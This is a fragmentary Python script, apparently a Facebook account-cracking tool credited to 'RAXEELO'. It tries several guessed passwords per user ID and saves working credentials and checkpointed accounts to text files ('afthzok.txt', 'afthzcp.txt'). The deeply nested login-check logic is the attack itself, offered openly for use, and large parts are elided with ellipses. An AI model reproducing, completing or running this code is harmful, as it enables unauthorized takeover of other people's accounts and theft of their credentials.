...
\033[1;92╔═╗╔══╗╔╗╔╗╔═╗╔═╗╔╗─╔═╗
                  ...
                  ╚╩╝╚╝╚╝╚╝╚╝╚═╝╚═╝╚═╝╚═╝  
                     ...
                     ╚═╝╚══╝╚╝╚╝╚╝╚╝╚═╝
\033[1;92m──────────────────────────────────•••••••••••
     \033[1;92m>> Author= RAXEELO
     \033[1;92m>> FACEBOOK= RAXEELO QAHAR
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [R4XEEL0-0K] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("afthzok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("afthzcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("afthzok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("afthzcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("afthzok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("afthzcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("afthzok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("afthzcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("afthzok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("afthzcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("afthzok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;32m [R4XEEL0_CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("afthzcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
	...
	print("")
	print(47*"-")
	print("   \x1b[1;92mCHAL NEKAL LORY")
...
def choice_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;33m [R4XEEL0-0K] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("afthzok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
	...
	print("")
	print(47*"-")
	print(" \x1b[1;92m  CHAL NEKAL LORY")
	print(" \x1b[1;92m   Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
